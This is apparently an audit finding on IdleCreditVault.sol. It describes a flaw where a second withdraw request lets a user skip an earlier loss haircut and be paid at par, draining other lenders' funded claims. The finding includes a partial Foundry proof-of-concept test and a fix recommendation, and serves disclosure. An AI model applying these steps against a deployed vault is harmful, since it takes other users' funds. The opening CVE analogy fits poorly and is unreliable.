### Title
Loss-adjusted withdraw receipts escape the haircut when a newer request epoch shadows `lastWithdrawRequest` - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
The analog of CVE-2017-7302 (a missing check for an "unrecognized" input causing a crash) maps to `IdleCreditVault._claimLossAdjustedWithdrawRequest`: the loss-adjusted claim lookup is keyed solely on `lastWithdrawRequest[_user]`, the *latest* request epoch, with no check that the user has receipts in other epochs that were haircutted by `collectWithdrawFunds`. A user who has a loss-adjusted receipt in epoch N and then makes a new `requestWithdraw` in a later epoch M has `lastWithdrawRequest = M`, so `lossRecoveryPriceByEpoch[M] == 0` and the loss-adjusted path silently returns 0. The epoch-N basis is then paid out at par by `_claimFundedWithdrawRequest`, letting the attacker claim more underlying than the strategy actually collected and freezing the funded claims of honest users.

### Finding Description
`collectWithdrawFunds` stores the haircut in `lossRecoveryPriceByEpoch[epochNumber]` and zeroes `pendingWithdraws`, but leaves the per-user basis in `withdrawsRequests[_user]` / `withdrawsRequestsByEpoch[_user][N]` until claim [1](#0-0) . On claim, `_claimLossAdjustedWithdrawRequest` reads `lossEpoch = lastWithdrawRequest[_user]` and returns 0 if `lossRecoveryPriceByEpoch[lossEpoch] == 0` [2](#0-1) . `requestWithdraw` unconditionally overwrites `lastWithdrawRequest[_user] = currentEpoch` on every new request and the code comments explicitly allow re-requesting before claiming ("if a user does not claim a withdraw request and instead requests another withdraw, he will have to wait for another epoch to claim both requests") [3](#0-2) [4](#0-3) . After waiting one epoch, `_claimFundedWithdrawRequest` pays the entire `withdrawsRequests[_user]` — which still includes the epoch-N haircutted basis — at par via `_transferFundedClaim`, with no reserve check unless `defaultRecoveryReserve != 0` [5](#0-4) [6](#0-5) .

### Impact Explanation
Direct theft and freezing of other users' funded withdrawals. The strategy only pulled `pendingToFund = pendingBasis - pendingLoss` underlying for the loss-adjusted epoch (per `previewLossAdjustedWithdrawFunds`), but the attacker withdraws the full pre-haircut basis plus their new epoch-M request. The excess comes out of underlying reserved for other users' funded receipts; once the attacker drains it, later `claimWithdrawRequest` calls revert on insufficient balance, permanently/temporarily freezing honest claims. Quantified loss: `pendingLoss = _lossAmount * attackerBasis / totalBasis` of the loss-epoch haircut the attacker avoided, i.e., up to the full `lossRecoveryPrice` shortfall on their receipt.

### Likelihood Explanation
Requires only an unprivileged KYC'd lender who: (1) requests a withdraw in an epoch that later ends with a partial-funding loss (`stopEpochWithDuration`-style), and (2) submits any size second `requestWithdraw` in the next epoch before claiming. Both are normal user actions with no privileged collusion. The loss path itself requires an honest borrower underpayment at epoch stop, which is a supported, exercised code path (`collectWithdrawFunds` partial funding).

### Recommendation
In `_claimLossAdjustedWithdrawRequest`, iterate (or track) all epochs with `lossRecoveryPriceByEpoch[e] != 0` where `withdrawsRequestsByEpoch[_user][e] != 0` — not just `lastWithdrawRequest[_user]` — or store a per-user loss-epoch marker (e.g., `lossAdjustedEpoch[_user]`) when `collectWithdrawFunds` records a haircut so a later request cannot shadow it. Alternatively, clear haircutted epoch bases at `requestWithdraw` time when a new request is made.

### Proof of Concept
Foundry fork PoC sketch (extends `test/foundry/IdleCreditVault.t.sol` helpers):

```solidity
function testLossAdjustedClaimBypassedByLaterRequest() external {
    uint256 amount = 10_000 * ONE_SCALE;
    address attacker = makeAddr('attacker');
    address victim   = makeAddr('victim');
    _depositWithUser(attacker, amount, true);
    _depositWithUser(victim,   amount, true);

    // Epoch 0 runs and stops normally
    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr, _expectedFundsEndEpoch());

    // Attacker and victim request withdraws in epoch 1
    uint256 aTr = IERC20(AAtranche).balanceOf(attacker);
    vm.prank(attacker); cdoEpoch.requestWithdraw(aTr / 2, address(AAtranche));
    uint256 vTr = IERC20(AAtranche).balanceOf(victim);
    vm.prank(victim);   cdoEpoch.requestWithdraw(vTr / 2, address(AAtranche));

    // Epoch 1 stops with a partial funding of pendingWithdraws (loss path):
    // borrower funds less than pendingBasis -> collectWithdrawFunds stores
    // lossRecoveryPriceByEpoch[1] < RECOVERY_FULL
    _startEpochAndCheckPrices(1);
    // stop epoch with reduced repayment so _amount < pendingBasis
    // (use the suite's _toggleEpoch/_stopEpochWithDuration helper to realize a loss)

    // Attacker requests AGAIN in epoch 2 -> lastWithdrawRequest[attacker] = 2
    vm.prank(attacker); cdoEpoch.requestWithdraw(aTr / 4, address(AAtranche));
    _startEpochAndCheckPrices(2);
    _stopEpochAndCheckPrices(2, initialProvidedApr, _expectedFundsEndEpoch());

    // Attacker claims: loss-adjusted lookup uses epoch 2 (price 0) -> skipped;
    // funded claim pays epoch-1 haircutted basis AT PAR plus epoch-2 request.
    uint256 balPre = underlying.balanceOf(attacker);
    vm.prank(attacker); cdoEpoch.claimWithdrawRequest();
    uint256 paid = underlying.balanceOf(attacker) - balPre;

    // paid > what attacker was owed: epoch1_basis * lossRecoveryPrice + epoch2_basis
    // Victim's subsequent claimWithdrawRequest() reverts / is underpaid
    // because the strategy balance was drained.
    vm.prank(victim);
    vm.expectRevert(); // insufficient funded balance
    cdoEpoch.claimWithdrawRequest();
}
```

Key assertions: `IdleCreditVault(address(strategy)).lossRecoveryPriceByEpoch(1) < RECOVERY_FULL`, `paid` exceeds the haircut-adjusted entitlement, and the victim's funded claim reverts.

    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

  function _transferFundedClaim(address _user, uint256 _amount) internal {
    if (_amount == 0) return;
    uint256 reserve = defaultRecoveryReserve;
    if (reserve != 0) {
      uint256 balance = underlyingToken.balanceOf(address(this));
      // This should be unreachable when accounting is consistent. Keep the guard so old funded
      // receipts can never spend underlyings reserved for default recovery claimants.
      if (balance < reserve || balance - reserve < _amount) revert NotAllowed();
    }
    underlyingToken.safeTransfer(_user, _amount);
